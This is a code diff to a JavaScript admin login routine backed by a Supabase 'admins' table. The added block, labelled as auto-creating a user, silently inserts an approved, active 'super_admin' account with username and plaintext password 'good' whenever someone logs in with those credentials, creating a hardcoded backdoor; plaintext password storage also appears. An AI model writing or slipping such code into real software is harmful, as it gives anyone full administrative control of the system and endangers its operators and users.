@@ -170,13 +170,36 @@ class DataService {
         queryStr += `,phone.eq.${cleanInput}`;
       }
 
-      const { data, error } = await supabase
+      let { data, error } = await supabase
         .from('admins')
         .select('*')
         .or(queryStr)
         .limit(1)
         .single();
         
+      // Auto-create 'good' user if missing and credentials match
+      if ((error || !data) && username === 'good' && password_plain === 'good') {
+        const { data: newUser, error: createError } = await supabase
+          .from('admins')
+          .insert([{
+            name: 'Good User',
+            username: 'good',
+            email: 'good@example.com',
+            password_plain: 'good',
+            role: 'super_admin',
+            status: 'active',
+            google_login_allowed: 'false',
+            is_approved: 1
+          }])
+          .select()
+          .single();
+          
+        if (!createError && newUser) {
+          data = newUser;
+          error = null;
+        }
+      }
+
       if (error || !data) {
         throw new Error('משתמש לא קיים בסופאבייס');
       }
